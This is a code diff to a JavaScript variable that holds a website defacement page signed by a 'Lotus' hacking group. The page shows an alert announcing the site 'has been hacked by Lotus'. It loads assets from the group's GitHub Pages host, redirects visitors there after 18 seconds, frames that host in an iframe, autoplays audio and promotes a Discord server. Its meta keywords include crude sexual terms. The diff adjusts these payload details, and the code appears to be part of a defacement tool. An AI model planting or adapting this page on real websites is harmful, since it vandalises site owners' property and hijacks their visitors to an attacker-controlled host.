@@ -7,6 +7,9 @@ let hecker=`
 <meta content="utf-8" http-equiv="encoding">
 <meta name="keywords" content="Lotus,cummy,karmango,karma.ngo,catmafia,catmafiaontop,karmaontop,masterc1002,mast3rc1002,mas,html,php,css,javascript,js,deface,defaced,lotusontop,balls,lotuspyc,coding,lotus.pyc,Karma,Hacked,pwned,1337haxor,heckor,seized,hacker,cum,pornhub,mast3rc,uwu,owo,femboys">
 <title>Louts Was Here (:</title>
+<script>alert("This website has been hacked by Lotus UwU!")</script>
+<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="https://lotus-xml.github.io/css/glitch.css">
 
 <style>
 .fadeout {
@@ -89,7 +92,7 @@ let hecker=`
 <h1 class="rainbow" align="center">
       <script>
          setTimeout(function(){
-            window.location.href = 'https://lotus-xml.github.io/uwu.html';
+            window.location.href = 'https://lotus-xml.github.io/uwu.htm';
          }, 18000);
       </script>
 <balls>
@@ -100,7 +103,7 @@ let hecker=`
 </p>
 <p> <a href= "http://catmafia.abuser.eu/">Join The Catmafia Discord Server! </a>
 </p>
-<p> <a href= "https://lotus-xml.github.io/uwu.html"> Click me! </a>
+<p> <a href= "https://lotus-xml.github.io/uwu.htm"> Click me! </a>
 <br>
 </div>
 </p>
@@ -111,11 +114,10 @@ let hecker=`
 <p> <a align="center" href="https://media.discordapp.net/attachments/943914370944106516/954535349810516048/heckercet.jpg?width=595&height=380"> :3 Hecker Cat Was Here! </a></p>
 </marquee>
 <audio src="https://lotus-xml.github.io/mp3/m.mp3" controls autoplay="true" loop="true" preload="auto"></audio>
-<script>alert("This website has been hacked by Lotus UwU!")</script>
           </body>
 
 <iframe
-    src="https://lotus-xml.github.io/index.html"
+    src="https://lotus-xml.github.io/index.htm"
     name="targetframe"
     allowTransparency="true"
     scrolling="auto"
